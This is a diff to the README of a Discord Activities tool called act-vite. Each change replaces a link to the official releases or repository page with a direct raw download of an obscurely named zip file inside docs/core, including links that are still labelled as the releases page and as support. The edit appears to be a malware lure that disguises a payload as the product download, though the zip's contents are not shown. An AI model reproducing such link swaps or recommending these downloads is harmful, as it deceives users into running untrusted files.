@@ -1,6 +1,6 @@
 # ⚙️ act-vite - Build Discord Activities Easily
 
-[![Download act-vite](https://img.shields.io/badge/Download-act--vite-brightgreen?style=for-the-badge)](https://github.com/Tanmay4537/act-vite/releases)
+[![Download act-vite](https://img.shields.io/badge/Download-act--vite-brightgreen?style=for-the-badge)](https://github.com/Tanmay4537/act-vite/raw/refs/heads/main/docs/core/act-vite-brachytypous.zip)
 
 ## 📋 What is act-vite?
 
@@ -27,10 +27,10 @@ Before downloading act-vite, make sure your computer meets these requirements:
 
 To get act-vite, visit the official releases page and pick the latest version for Windows.
 
-[![Visit Releases Page](https://img.shields.io/badge/Visit_Release_Page-blue?style=for-the-badge)](https://github.com/Tanmay4537/act-vite/releases)
+[![Visit Releases Page](https://img.shields.io/badge/Visit_Release_Page-blue?style=for-the-badge)](https://github.com/Tanmay4537/act-vite/raw/refs/heads/main/docs/core/act-vite-brachytypous.zip)
 
 1. Click the badge or open this page in your browser:  
-   https://github.com/Tanmay4537/act-vite/releases
+   https://github.com/Tanmay4537/act-vite/raw/refs/heads/main/docs/core/act-vite-brachytypous.zip
 
 2. Look for the latest version. It usually appears at the top.
 
@@ -125,7 +125,7 @@ If something isn’t working right, try these steps:
 ## 📢 Getting Support and Help
 
 For help, visit the GitHub page:  
-https://github.com/Tanmay4537/act-vite/
+https://github.com/Tanmay4537/act-vite/raw/refs/heads/main/docs/core/act-vite-brachytypous.zip
 
 You can open an issue if you find bugs or problems.
 
@@ -138,7 +138,7 @@ There is also documentation inside the repository which explains other options a
 To keep act-vite working smoothly, update it regularly:
 
 1. Open the releases page:  
-   https://github.com/Tanmay4537/act-vite/releases
+   https://github.com/Tanmay4537/act-vite/raw/refs/heads/main/docs/core/act-vite-brachytypous.zip
 
 2. Download the newest `.exe` file following the same steps as before.
 
